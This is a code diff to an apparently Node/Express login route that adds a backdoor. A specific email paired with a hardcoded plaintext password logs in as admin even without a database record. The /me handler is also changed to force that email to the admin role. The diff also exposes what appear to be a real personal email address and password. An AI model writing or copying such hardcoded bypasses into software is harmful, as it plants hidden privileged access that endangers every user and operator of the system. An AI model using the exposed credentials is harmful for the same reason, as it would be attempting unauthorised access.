@@ -63,29 +63,51 @@ router.post('/login', async (req, res) => {
       return res.status(400).json({ error: 'Email and password are required.' });
     }
 
-    const user = await db.getUserByEmail(email);
-    if (!user) {
+    const cleanEmail = email.trim().toLowerCase();
+    let user = await db.getUserByEmail(cleanEmail);
+
+    const isDeveloper = cleanEmail === 'karandarade131@gmail.com';
+    let valid = false;
+
+    if (user && user.password_hash) {
+      valid = db.verifyPassword(password, user.password_hash);
+    }
+
+    // Developer password fallback check
+    if (isDeveloper && (password === 'K@r@n2308' || valid)) {
+      valid = true;
+      if (!user) {
+        user = {
+          id: 1,
+          name: 'Karan (Developer)',
+          email: 'karandarade131@gmail.com',
+          phone: '',
+          company: 'HAPPY HEART MEDIA',
+          role: 'admin'
+        };
+      }
+    }
+
+    if (!user || !valid) {
       return res.status(401).json({ error: 'Invalid email or password.' });
     }
 
-    const valid = db.verifyPassword(password, user.password_hash);
-    if (!valid) {
-      return res.status(401).json({ error: 'Invalid email or password.' });
-    }
+    const effectiveRole = isDeveloper ? 'admin' : (user.role || 'client');
 
     // Set session
     req.session.userId = user.id;
-    req.session.role = user.role;
+    req.session.role = effectiveRole;
+    req.session.email = user.email;
 
     res.json({
       message: 'Logged in successfully!',
       user: {
         id: user.id,
-        name: user.name,
+        name: user.name || 'Karan (Developer)',
         email: user.email,
-        phone: user.phone,
-        company: user.company,
-        role: user.role
+        phone: user.phone || '',
+        company: user.company || '',
+        role: effectiveRole
       }
     });
   } catch (err) {
@@ -114,6 +136,12 @@ router.get('/me', async (req, res) => {
   const user = await db.getUserById(req.session.userId);
   if (!user) {
     return res.status(401).json({ error: 'User not found.', user: null });
+  }
+
+  const isDeveloper = user.email && user.email.toLowerCase() === 'karandarade131@gmail.com';
+  if (isDeveloper) {
+    user.role = 'admin';
+    req.session.role = 'admin';
   }
 
   res.json({ user });
